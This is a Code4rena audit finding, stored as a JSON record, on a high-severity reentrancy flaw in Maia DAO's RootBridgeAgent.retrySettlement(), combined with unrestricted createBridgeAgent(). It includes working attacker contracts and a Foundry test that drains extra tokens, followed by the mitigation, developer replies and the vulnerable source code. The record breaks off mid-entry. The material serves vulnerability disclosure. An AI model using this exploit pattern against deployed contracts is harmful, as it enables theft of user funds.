{
  "Title": "[H-18] Reentrancy attack possible on `RootBridgeAgent.retrySettlement()` with missing access control for `RootBridgeAgentFactory.createBridgeAgent()`",
  "Content": "\n`RootBridgeAgent.retrySettlement()` is lacking a `lock` modifier to prevent reentrancy and `RootBridgeAgentFactory.createBridgeAgent()` is missing access control. Both issues combined allow anyone to re-enter `retrySettlement()` and trigger the same settlement repeatedly.\n\n### Impact\n\nAn attacker can steal funds from the protocol by executing the same settlement multiple times before it is marked as executed.\n\n### Issue #1\n\nIn `RootBridgeAgentFactory`, the privileged function `createBridgeAgent()` is lacking access control, which allows anyone to deploy a new `RootBridgeAgent`. Leveraging that, the attacker can inject malicious `RootRouter` and `BranchRouter` that can be used to trigger a reentrancy attack in `retrySettlement()`. Injection of the malicious `BranchRouter` is done with a separate call to `CoreRootRouter.addBranchToBridgeAgent()` in [CoreRootRouter.sol#L81-L116](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/CoreRootRouter.sol#L81-L116), refer to POC for actual steps.\n\n```Solidity\n    function createBridgeAgent(address _newRootRouterAddress) external returns (address newBridgeAgent) {\n        newBridgeAgent = address(\n            DeployRootBridgeAgent.deploy(\n                wrappedNativeToken,\n                rootChainId,\n                daoAddress,\n                local`AnyCall`Address,\n                local`AnyCall`ExecutorAddress,\n                rootPortAddress,\n                _newRootRouterAddress\n            )\n        );\n\n        IRootPort(rootPortAddress).addBridgeAgent(msg.sender, newBridgeAgent);\n    }\n```\n\n<https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol#L75C1-L89C6>\n\n### Issue #2\n\nIn `RootBridgeAgent`, the `retrySettlement()` function is not protected from reentrancy with the `lock` modifier. We can then re-enter this function via the injected malicious `BranchRouter` (Issue #1). The malicious `BranchRouter` can be triggered via `BranchBridgeAgentExecutor` when the attacker performs the settlement call. That will execute `IRouter(_router).anyExecuteSettlement()` when additional `calldata` is passed in, as shown in [BranchBridgeAgentExecutor.sol#L110](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgentExecutor.sol#L110).\n\n```Solidity\n    function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {\n        //Update User Gas available.\n        if (initialGas == 0) {\n            userFeeInfo.depositedGas = uint128(msg.value);\n            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;\n        }\n        //Clear Settlement with updated gas.\n        _retrySettlement(_settlementNonce);\n    }\n```\n<https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252>\n\n### Proof of Concept\n\n1. First append the following malicious router contracts to `RootTest.t.sol`:\n\n```Solidity\nimport {\n    SettlementParams\n} from \"@omni/interfaces/IBranchBridgeAgent.sol\";\n\ncontract AttackerBranchRouter is BaseBranchRouter {\n\n    uint256 counter;\n\n    function anyExecuteSettlement(bytes calldata data, SettlementParams memory sParams)\n        external\n        override\n        returns (bool success, bytes memory result)\n    {\n        // limit the recursive loop to re-enter 4 times (just for POC purpose)\n        if(counter++ == 4) return (true, \"\");\n\n        address rootBridgeAgentAddress =  address(uint160(bytes20(data[0:20])));\n\n        // Re-enter retrySettlement() before the first settlement is marked as executed\n        RootBridgeAgent rootBridgeAgent = RootBridgeAgent(payable(rootBridgeAgentAddress));\n        rootBridgeAgent.retrySettlement{value: 3e11 }(sParams.settlementNonce, 1e11);\n\n        // Top-up gas for BranchBridgeAgent as retrySettlement() will refund gas after each call\n        BranchBridgeAgent branchAgent = BranchBridgeAgent(payable(localBridgeAgentAddress));\n        WETH9 nativeToken = WETH9(branchAgent.wrappedNativeToken());\n        nativeToken.deposit{value: 1e11}();\n        nativeToken.transfer(address(branchAgent), 1e11);\n    }\n\n    fallback() external payable {}\n}\n\ncontract AttackerRouter is Test {\n\n    function reentrancyAttack(\n        RootBridgeAgent _rootBridgeAgent, \n        address owner,\n        address recipient,\n        address outputToken,\n        uint256 amountOut,\n        uint256 depositOut,\n        uint24 toChain\n    ) external payable {\n\n        // Approve Root Port to spend/send output hTokens.\n        ERC20hTokenRoot(outputToken).approve(address(_rootBridgeAgent), amountOut);\n\n        // Encode calldata to pass in rootBridgeAgent address and \n        // also to trigger exeuction of anyExecuteSettlement\n        bytes memory data = abi.encodePacked(address(_rootBridgeAgent));\n\n        // Initiate the first settlement\n        _rootBridgeAgent.callOutAndBridge{value: msg.value}(\n            owner, recipient, data, outputToken, amountOut, depositOut, toChain\n        );\n    }\n}\n```\n\n2. Then add and run following test case in the `RootTest` contract within `RootTest.t.sol`:\n\n```Solidity\n    function testPeakboltRetrySettlementReentrancy() public {\n        //Set up\n        testAddLocalTokenArbitrum();\n\n        address attacker = address(0x999);\n\n        // Attacker deploys RootBridgeAgent with malicious Routers \n        // Issue 1 - RootBridgeAgentFactory.createBridgeAgent() has no access control, \n        //           which allows anyone to create RootBridgeAgent and inject RootRouter and BranchRouter.\n        hevm.startPrank(attacker);\n        AttackerRouter attackerRouter = new AttackerRouter();\n        AttackerBranchRouter attackerBranchRouter = new AttackerBranchRouter();\n        RootBridgeAgent attackerBridgeAgent = RootBridgeAgent(\n            payable(RootBridgeAgentFactory(bridgeAgentFactory).createBridgeAgent(address(attackerRouter)))\n        );\n        attackerBridgeAgent.approveBranchBridgeAgent(ftmChainId);\n        hevm.stopPrank();\n\n        //Get some gas.\n        hevm.deal(attacker, 0.1 ether);\n        hevm.deal(address(attackerBranchRouter), 0.1 ether);\n\n        // Add FTM branchBridgeAgent and inject the malicious BranchRouter \n        hevm.prank(attacker);\n        rootCoreRouter.addBranchToBridgeAgent{value: 1e12}(\n            address(attackerBridgeAgent),\n            address(ftmBranchBridgeAgentFactory),\n            address(attackerBranchRouter),\n            address(ftmCoreRouter),\n            ftmChainId,\n            5e11\n        );\n\n        // Initialize malicious BranchRouter with the created BranchBridgeAgent for FTM \n        BranchBridgeAgent attackerBranchBridgeAgent = BranchBridgeAgent(payable(attackerBridgeAgent.getBranchBridgeAgent(ftmChainId)));\n        hevm.prank(attacker);\n        attackerBranchRouter.initialize(address(attackerBranchBridgeAgent));\n\n\n        // Get some hTokens for attacker to create the first settlement\n        uint128 settlementAmount = 10 ether;\n        hevm.prank(address(rootPort));\n        ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(attacker, settlementAmount, rootChainId);\n\n        console2.log(\"STATE BEFORE:\");\n\n        // Attacker should have zero AvaxAssetLocalToken before bridging to FTM via the settlement\n        console2.log(\"Attacker newAvaxAssetLocalToken (FTM) Balance: \\t\", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));\n        require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 0);\n\n        // Attacker will start with 1e18 hTokens for the first settlement\n        console2.log(\"Attacker Global Balance: \\t\", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));\n        require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == settlementAmount);\n\n        // Expect next settlementNonce to be '1' before settlement creation\n        console2.log(\"attackerBridgeAgent.settlementNonce: %d\", attackerBridgeAgent.settlementNonce());\n        require(attackerBridgeAgent.settlementNonce() == 1);\n\n        // Execution history in BranchBridgeAgent is not marked yet\n        console2.log(\"attackerBranchBridgeAgent.executionHistory(1) = %s\", attackerBranchBridgeAgent.executionHistory(1));\n        console2.log(\"attackerBranchBridgeAgent.executionHistory(2) = %s\", attackerBranchBridgeAgent.executionHistory(2));\n\n\n        // Attacker transfers hTokens into router, triggers the first settlement and then the reentrancy attack\n        // Issue 2 - RootBridgeAgent.retrySettlement() has no lock to prevent reentrancy \n        //           We can re-enter retrySettlement() via the injected malicious BranchRouter (above)\n        //           Refer to AttackerRouter and AttackerBranchRouter contracts to see the reentrance calls\n        hevm.prank(attacker);\n        MockERC20(newAvaxAssetGlobalAddress).transfer(address(attackerRouter), settlementAmount);\n\n        hevm.prank(attacker);\n        attackerRouter.reentrancyAttack{value: 1e13 }(attackerBridgeAgent, attacker, attacker, address(newAvaxAssetGlobalAddress), settlementAmount,  0, ftmChainId);\n  \n\n        console2.log(\"STATE AFTER:\");\n\n        // Attacker will now have 5e19 AvaxAssetLocalToken after using 1e19 and some gas to perform 4x recursive reentrancy attack\n        console2.log(\"Attacker newAvaxAssetLocalToken (FTM) Balance: \", MockERC20(newAvaxAssetLocalToken).balanceOf(attacker));\n        require(MockERC20(newAvaxAssetLocalToken).balanceOf(attacker) == 5e19);\n\n        // The hTokens have been used for the first settlement\n        console2.log(\"Attacker Global Balance: \", MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker));\n        require(MockERC20(newAvaxAssetGlobalAddress).balanceOf(attacker) == 0);\n\n        // Expect next settlementNonce to be '2' as we only used '1' for the attacker\n        console2.log(\"attackerBridgeAgent.settlementNonce: %d\",  attackerBridgeAgent.settlementNonce());\n        require(attackerBridgeAgent.settlementNonce() == 2);\n\n        // This shows that only execution is marked for settlementNonce '1' \n        console2.log(\"attackerBranchBridgeAgent.executionHistory(1): %s\", attackerBranchBridgeAgent.executionHistory(1));\n        console2.log(\"attackerBranchBridgeAgent.executionHistory(2): %s\", attackerBranchBridgeAgent.executionHistory(2));\n    \n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd a `lock` modifier to `RootBridgeAgent.retrySettlement()` and add access control to `RootBridgeAgentFactory.createBridgeAgent()`.\n\n**[0xBugsy (Maia) confirmed and commented](https://github.com/code-423n4/2023-05-maia-findings/issues/492#issuecomment-1632816163):**\n > Due to a cross-chain tx being composed of several txs on different networks, this would only be feasible on arbitrum, since it's the only chain where both `root` and `branch` contracts co-exist; allowing you to nest new retrys inside the previous. Otherwise, the nonce would be flagged as executed in the execution history after the first successful run. But definitely the `lock` should be added.\n\n**[0xBugsy (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/492#issuecomment-1641038311):**\n > To give a little further context on my reply: \n> \n> 1. The permissionless addition of `Bridge Agent` does not expose any unintended functions to the `Router`, so this part is completely intended on our behalf.\n> \n> 2. The core issue here, really resides on the fact that the `executionHistory[nonce] = true;` should be done in the `Branch` and `Root` `Bridge Agents` before and not after (respecting CEI), calling their respective `Executor` within a try-catch block. Adding a `lock` can also be introduced as a safe-guard, but adding that by itself we would still be able to do this attack once within the original settlement.\n\n**[0xLightt (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/492#issuecomment-1709165849):**\n> Addressed [here](https://github.com/Maia-DAO/eco-c4-contest/tree/183-492-688-869).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-05-maia",
  "Code": [
    {
      "filename": "src/ulysses-omnichain/CoreRootRouter.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Ownable} from \"solady/auth/Ownable.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {WETH9} from \"./interfaces/IWETH9.sol\";\n\nimport {IERC20hTokenRootFactory as IFactory} from \"./interfaces/IERC20hTokenRootFactory.sol\";\nimport {IRootRouter} from \"./interfaces/IRootRouter.sol\";\nimport {IRootBridgeAgent as IBridgeAgent} from \"./interfaces/IRootBridgeAgent.sol\";\nimport {IRootPort as IPort} from \"./interfaces/IRootPort.sol\";\nimport {IVirtualAccount, Call} from \"./interfaces/IVirtualAccount.sol\";\n\nimport {DepositParams, DepositMultipleParams} from \"./interfaces/IRootBridgeAgent.sol\";\nimport {ERC20hTokenRoot} from \"./token/ERC20hTokenRoot.sol\";\n\n/**\n * @title  Core Root Router Contract\n * @author MaiaDAO\n * @notice Core Root Router implementation for Root Environment deployment.\n *         This contract is responsible for permissionlessly adding new\n *         tokens or Bridge Agents to the system as well as key governance\n *         enabled system functions (i.e. `toggleBranchBridgeAgentFactory`).\n * @dev    Func IDs for calling these functions through messaging layer:\n *\n *         CROSS-CHAIN MESSAGING FUNCIDs\n *         -----------------------------\n *         FUNC ID      | FUNC NAME\n *         -------------+---------------\n *         0x01         | addGlobalToken\n *         0x02         | addLocalToken\n *         0x03         | setLocalToken\n *         0x04         | syncBranchBridgeAgent\n *\n */\ncontract CoreRootRouter is IRootRouter, Ownable {\n    /// @notice Local Wrapped Native Token\n    WETH9 public immutable wrappedNativeToken;\n\n    /// @notice Address for Local Port Address where funds deposited from this chain are kept, managed and supplied to different Port Strategies.\n    uint24 public immutable rootChainId;\n\n    /// @notice Address for Local Port Address where funds deposited from this chain are kept, managed and supplied to different Port Strategies.\n    address public immutable rootPortAddress;\n\n    /// @notice Bridge Agent to maneg communcations and cross-chain assets.\n    address payable public bridgeAgentAddress;\n\n    address public bridgeAgentExecutorAddress;\n\n    /// @notice Uni V3 Factory Address\n    address public hTokenFactoryAddress;\n\n    constructor(uint24 _rootChainId, address _wrappedNativeToken, address _rootPortAddress) {\n        rootChainId = _rootChainId;\n        wrappedNativeToken = WETH9(_wrappedNativeToken);\n        rootPortAddress = _rootPortAddress;\n        _initializeOwner(msg.sender);\n    }\n\n    function initialize(address _bridgeAgentAddress, address _hTokenFactory) external onlyOwner {\n        bridgeAgentAddress = payable(_bridgeAgentAddress);\n        bridgeAgentExecutorAddress = IBridgeAgent(_bridgeAgentAddress).bridgeAgentExecutorAddress();\n        hTokenFactoryAddress = _hTokenFactory;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                    BRIDGE AGENT MANAGEMENT FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Add a new Chain (Branch Bridge Agent and respective Router) to a Root Bridge Agent.\n     * @param _branchBridgeAgentFactory Address of the branch Bridge Agent Factory.\n     * @param _newBranchRouter Address of the new branch router.\n     * @param _gasReceiver Address of the excess gas receiver.\n     * @param _toChain Chain Id of the branch chain where the new Bridge Agent will be deployed.\n     * @param _remoteExecutionGas gas to be bridged back to root chain.\n     */\n    function addBranchToBridgeAgent(\n        address _rootBridgeAgent,\n        address _branchBridgeAgentFactory,\n        address _newBranchRouter,\n        address _gasReceiver,\n        uint24 _toChain,\n        uint128 _remoteExecutionGas\n    ) external payable {\n        // Check if msg.sender is the Bridge Agent Manager\n        if (msg.sender != IPort(rootPortAddress).getBridgeAgentManager(_rootBridgeAgent)) {\n            revert UnauthorizedCallerNotManager();\n        }\n\n        //Check if valid chain\n        if (!IPort(rootPortAddress).isChainId(_toChain)) revert InvalidChainId();\n\n        //Check if chain already added to bridge agent\n        if (IBridgeAgent(_rootBridgeAgent).getBranchBridgeAgent(_toChain) != address(0)) revert InvalidChainId();\n\n        //Check if Branch Bridge Agent is allowed by Root Bridge Agent\n        if (!IBridgeAgent(_rootBridgeAgent).isBranchBridgeAgentAllowed(_toChain)) revert UnauthorizedChainId();\n\n        //Root Bridge Agent Factory Address\n        address rootBridgeAgentFactory = IBridgeAgent(_rootBridgeAgent).factoryAddress();\n\n        //Encode CallData\n        bytes memory data = abi.encode(\n            _newBranchRouter, _branchBridgeAgentFactory, _rootBridgeAgent, rootBridgeAgentFactory, _remoteExecutionGas\n        );\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x02), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut{value: msg.value}(_gasReceiver, packedData, _toChain);\n    }\n\n    /**\n     * @dev Internal function sync a Root Bridge Agent with a newly created BRanch Bridge Agent.\n     *   @param _newBranchBridgeAgent new branch bridge agent address\n     *   @param _rootBridgeAgent new branch bridge agent address\n     *   @param _fromChain branch chain id.\n     *\n     */\n    function _syncBranchBridgeAgent(address _newBranchBridgeAgent, address _rootBridgeAgent, uint24 _fromChain)\n        internal\n    {\n        IPort(rootPortAddress).syncBranchBridgeAgentWithRoot(_newBranchBridgeAgent, _rootBridgeAgent, _fromChain);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        TOKEN MANAGEMENT FUNCTIONS\n    ////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Internal function to add a global token to a specific chain. Must be called from a branch.\n     *   @param _remoteExecutionGas gas to be used in remote execution.\n     *   @param _globalAddress global token to be added.\n     *   @param _gasReceiver Address of the excess gas receiver.\n     *   @param _toChain chain to which the Global Token will be added.\n     *\n     */\n    function _addGlobalToken(uint128 _remoteExecutionGas, address _globalAddress, address _gasReceiver, uint24 _toChain)\n        internal\n    {\n        if (_toChain == rootChainId) revert InvalidChainId();\n\n        if (!IPort(rootPortAddress).isGlobalAddress(_globalAddress)) {\n            revert UnrecognizedGlobalToken();\n        }\n\n        //Verify that it does not exist\n        if (IPort(rootPortAddress).isGlobalToken(_globalAddress, _toChain)) {\n            revert TokenAlreadyAdded();\n        }\n\n        //Encode CallData\n        bytes memory data = abi.encode(\n            _globalAddress, ERC20(_globalAddress).name(), ERC20(_globalAddress).symbol(), _remoteExecutionGas\n        );\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x01), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut(_gasReceiver, packedData, _toChain);\n    }\n\n    /**\n     * @notice Function to add a new local to the global environment. Called from branch chain.\n     *   @param _underlyingAddress the token's underlying/native chain address.\n     *   @param _localAddress the token's address.\n     *   @param _name the token's name.\n     *   @param _symbol the token's symbol.\n     *   @param _fromChain the token's origin chain Id.\n     *\n     */\n    function _addLocalToken(\n        address _underlyingAddress,\n        address _localAddress,\n        string memory _name,\n        string memory _symbol,\n        uint24 _fromChain\n    ) internal {\n        // Verify if underlying address is already known by branch or root chain\n        if (\n            IPort(rootPortAddress).isGlobalAddress(_underlyingAddress)\n                || IPort(rootPortAddress).isLocalToken(_underlyingAddress, _fromChain)\n                || IPort(rootPortAddress).isUnderlyingToken(_underlyingAddress, _fromChain)\n        ) revert TokenAlreadyAdded();\n\n        //Create new global token\n        address newToken = address(IFactory(hTokenFactoryAddress).createToken(_name, _symbol));\n\n        //Update Registry\n        IPort(rootPortAddress).setAddresses(\n            newToken, (_fromChain == rootChainId) ? newToken : _localAddress, _underlyingAddress, _fromChain\n        );\n    }\n\n    /**\n     * @notice Internal function to set the local token on a specific chain for a global token.\n     *   @param _globalAddress global token to be updated.\n     *   @param _localAddress local token to be added.\n     *   @param _toChain local token's chain.\n     *\n     */\n    function _setLocalToken(address _globalAddress, address _localAddress, uint24 _toChain) internal {\n        // Verify if token already added\n        if (IPort(rootPortAddress).isLocalToken(_localAddress, _toChain)) revert TokenAlreadyAdded();\n\n        // Set global token's new branch chain address\n        IPort(rootPortAddress).setLocalAddress(_globalAddress, _localAddress, _toChain);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                    GOVERNANCE / ADMIN FUNCTIONS\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Add or Remove a Branch Bridge Agent Factory.\n     * @param _rootBridgeAgentFactory Address of the root Bridge Agent Factory.\n     * @param _branchBridgeAgentFactory Address of the branch Bridge Agent Factory.\n     * @param _gasReceiver Receiver of any leftover execution gas upon reaching destination network.\n     * @param _toChain Chain Id of the branch chain where the new Bridge Agent will be deployed.\n     */\n    function toggleBranchBridgeAgentFactory(\n        address _rootBridgeAgentFactory,\n        address _branchBridgeAgentFactory,\n        address _gasReceiver,\n        uint24 _toChain\n    ) external payable onlyOwner {\n        if (!IPort(rootPortAddress).isBridgeAgentFactory(_rootBridgeAgentFactory)) {\n            revert UnrecognizedBridgeAgentFactory();\n        }\n\n        //Encode CallData\n        bytes memory data = abi.encode(_branchBridgeAgentFactory);\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x03), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut{value: msg.value}(_gasReceiver, packedData, _toChain);\n    }\n\n    /**\n     * @notice Remove a Branch Bridge Agent.\n     * @param _branchBridgeAgent Address of the Branch Bridge Agent to be updated.\n     * @param _gasReceiver Receiver of any leftover execution gas upon reaching destination network.\n     * @param _toChain Chain Id of the branch chain where the new Bridge Agent will be deployed.\n     */\n    function removeBranchBridgeAgent(address _branchBridgeAgent, address _gasReceiver, uint24 _toChain)\n        external\n        payable\n        onlyOwner\n    {\n        //Encode CallData\n        bytes memory data = abi.encode(_branchBridgeAgent);\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x04), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut{value: msg.value}(_gasReceiver, packedData, _toChain);\n    }\n\n    /**\n     * @notice Add or Remove a Strategy Token.\n     * @param _underlyingToken Address of the underlying token to be added for use in Branch strategies.\n     * @param _minimumReservesRatio Minimum Branch Port reserves ratio for the underlying token.\n     * @param _gasReceiver Receiver of any leftover execution gas upon reaching destination network.\n     * @param _toChain Chain Id of the branch chain where the new Bridge Agent will be deployed.\n     */\n    function manageStrategyToken(\n        address _underlyingToken,\n        uint256 _minimumReservesRatio,\n        address _gasReceiver,\n        uint24 _toChain\n    ) external payable onlyOwner {\n        //Encode CallData\n        bytes memory data = abi.encode(_underlyingToken, _minimumReservesRatio);\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x05), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut{value: msg.value}(_gasReceiver, packedData, _toChain);\n    }\n\n    /**\n     * @notice Add, Remove or update a Port Strategy.\n     * @param _portStrategy Address of the Port Strategy to be added for use in Branch strategies.\n     * @param _underlyingToken Address of the underlying token to be added for use in Branch strategies.\n     * @param _dailyManagementLimit Daily management limit of the given token for the Port Strategy.\n     * @param _isUpdateDailyLimit Boolean to safely indicate if the Port Strategy is being updated and not deactivated.\n     * @param _gasReceiver Receiver of any leftover execution gas upon reaching destination network.\n     * @param _toChain Chain Id of the branch chain where the new Bridge Agent will be deployed.\n     */\n    function managePortStrategy(\n        address _portStrategy,\n        address _underlyingToken,\n        uint256 _dailyManagementLimit,\n        bool _isUpdateDailyLimit,\n        address _gasReceiver,\n        uint24 _toChain\n    ) external payable onlyOwner {\n        //Encode CallData\n        bytes memory data = abi.encode(_portStrategy, _underlyingToken, _dailyManagementLimit, _isUpdateDailyLimit);\n\n        //Pack funcId into data\n        bytes memory packedData = abi.encodePacked(bytes1(0x06), data);\n\n        //Add new global token to branch chain\n        IBridgeAgent(bridgeAgentAddress).callOut{value: msg.value}(_gasReceiver, packedData, _toChain);\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        ANYCALL FUNCTIONS\n    ///////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteResponse(bytes1 _funcId, bytes calldata _encodedData, uint24 fromChainId)\n        external\n        payable\n        override\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        /// FUNC ID: 3 (_setLocalToken)\n        if (_funcId == 0x03) {\n            (address globalAddress, address localAddress) = abi.decode(_encodedData, (address, address));\n\n            _setLocalToken(globalAddress, localAddress, fromChainId);\n\n            /// FUNC ID: 4 (_syncBranchBridgeAgent)\n        } else if (_funcId == 0x04) {\n            (address newBranchBridgeAgent, address rootBridgeAgent) = abi.decode(_encodedData, (address, address));\n\n            _syncBranchBridgeAgent(newBranchBridgeAgent, rootBridgeAgent, fromChainId);\n\n            /// Unrecognized Function Selector\n        } else {\n            return (false, \"unknown selector\");\n        }\n        return (true, \"\");\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecute(bytes1 _funcId, bytes calldata _encodedData, uint24 _fromChainId)\n        external\n        payable\n        override\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        /// FUNC ID: 1 (_addGlobalToken)\n        if (_funcId == 0x01) {\n            (address gasReceiver, address globalAddress, uint24 toChain, uint128 remoteExecutionGas) =\n                abi.decode(_encodedData, (address, address, uint24, uint128));\n\n            _addGlobalToken(remoteExecutionGas, globalAddress, gasReceiver, toChain);\n\n            ///  FUNC ID: 2 (_addLocalToken)\n        } else if (_funcId == 0x02) {\n            (address underlyingAddress, address localAddress, string memory name, string memory symbol) =\n                abi.decode(_encodedData, (address, address, string, string));\n\n            _addLocalToken(underlyingAddress, localAddress, name, symbol, _fromChainId);\n\n            /// Unrecognized Function Selector\n        } else {\n            return (false, \"unknown selector\");\n        }\n        return (true, \"\");\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteDepositSingle(bytes1, bytes memory, DepositParams memory, uint24)\n        external\n        payable\n        override\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        revert();\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteDepositMultiple(bytes1, bytes calldata, DepositMultipleParams memory, uint24)\n        external\n        payable\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        revert();\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteSigned(bytes1, bytes memory, address, uint24)\n        external\n        payable\n        override\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        revert();\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteSignedDepositSingle(bytes1, bytes memory, DepositParams memory, address, uint24)\n        external\n        payable\n        override\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        revert();\n    }\n\n    /// @inheritdoc IRootRouter\n    function anyExecuteSignedDepositMultiple(bytes1, bytes memory, DepositMultipleParams memory, address, uint24)\n        external\n        payable\n        requiresExecutor\n        returns (bool, bytes memory)\n    {\n        revert();\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                            MODIFIERS\n    ///////////////////////////////////////////////////////////////*/\n\n    uint256 internal _unlocked = 1;\n\n    /// @notice Modifier for a simple re-entrancy check.\n    modifier lock() {\n        require(_unlocked == 1);\n        _unlocked = 2;\n        _;\n        _unlocked = 1;\n    }\n\n    /// @notice Modifier verifies the caller is the Bridge Agent Executor.\n    modifier requiresExecutor() {\n        _requiresExecutor();\n        _;\n    }\n\n    /// @notice Internal function verifies the caller is the Bridge Agent Executor. Reuse to reduce contract bytesize\n    function _requiresExecutor() internal view {\n        if (msg.sender != bridgeAgentExecutorAddress) revert UnrecognizedBridgeAgentExecutor();\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                                ERROR\n    ///////////////////////////////////////////////////////////////*/\n\n    error InvalidChainId();\n\n    error UnauthorizedChainId();\n\n    error UnauthorizedCallerNotManager();\n\n    error TokenAlreadyAdded();\n\n    error UnrecognizedGlobalToken();\n\n    error UnrecognizedBridgeAgentFactory();\n}"
    },
    {
      "filename": "src/ulysses-omnichain/factories/RootBridgeAgentFactory.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Ownable} from \"solady/auth/Ownable.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport {WETH9} from \"../interfaces/IWETH9.sol\";\n\nimport {IAnycallProxy} from \"../interfaces/IAnycallProxy.sol\";\nimport {IRootBridgeAgent} from \"../interfaces/IRootBridgeAgent.sol\";\nimport {IRootBridgeAgentFactory} from \"../interfaces/IRootBridgeAgentFactory.sol\";\nimport {IRootPort} from \"../interfaces/IRootPort.sol\";\n\nimport {DeployRootBridgeAgent, RootBridgeAgent} from \"../RootBridgeAgent.sol\";\n\n/// @title Root Bridge Agent Factory Contract\ncontract RootBridgeAgentFactory is IRootBridgeAgentFactory {\n    /// @notice Root Chain Id\n    uint24 public immutable rootChainId;\n\n    /// @notice Local Wrapped Native Token\n    WETH9 public immutable wrappedNativeToken;\n\n    /// @notice Root Port Address\n    address public immutable rootPortAddress;\n\n    /// @notice DAO Address\n    address public immutable daoAddress;\n\n    /// @notice Local Anycall Address\n    address public immutable localAnyCallAddress;\n\n    /// @notice Local Anyexec Address\n    address public immutable localAnyCallExecutorAddress;\n\n    /// @notice Bridge Agent Manager\n    mapping(address => address) public getBridgeAgentManager;\n\n    /**\n     * @notice Constructor for Bridge Agent.\n     *     @param _rootChainId Root Chain Id.\n     *     @param _wrappedNativeToken Local Wrapped Native Token.\n     *     @param _localAnyCallAddress Local Anycall Address.\n     *     @param _rootPortAddress Local Port Address.\n     *     @param _daoAddress DAO Address.\n     */\n    constructor(\n        uint24 _rootChainId,\n        WETH9 _wrappedNativeToken,\n        address _localAnyCallAddress,\n        address _rootPortAddress,\n        address _daoAddress\n    ) {\n        require(address(_wrappedNativeToken) != address(0), \"Wrapped Native Token cannot be 0\");\n        require(_rootPortAddress != address(0), \"Root Port Address cannot be 0\");\n        require(_daoAddress != address(0), \"DAO Address cannot be 0\");\n\n        rootChainId = _rootChainId;\n        wrappedNativeToken = _wrappedNativeToken;\n        localAnyCallAddress = _localAnyCallAddress;\n        localAnyCallExecutorAddress = IAnycallProxy(localAnyCallAddress).executor();\n        rootPortAddress = _rootPortAddress;\n        daoAddress = _daoAddress;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        BRIDGE AGENT FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n    /**\n     * @notice Creates a new Root Bridge Agent.\n     *   @param _newRootRouterAddress New Root Router Address.\n     *   @return newBridgeAgent New Bridge Agent Address.\n     */\n    function createBridgeAgent(address _newRootRouterAddress) external returns (address newBridgeAgent) {\n        newBridgeAgent = address(\n            DeployRootBridgeAgent.deploy(\n                wrappedNativeToken,\n                rootChainId,\n                daoAddress,\n                localAnyCallAddress,\n                localAnyCallExecutorAddress,\n                rootPortAddress,\n                _newRootRouterAddress\n            )\n        );\n\n        IRootPort(rootPortAddress).addBridgeAgent(msg.sender, newBridgeAgent);\n    }\n}"
    },
    {
      "filename": "src/ulysses-omnichain/BranchBridgeAgentExecutor.sol",
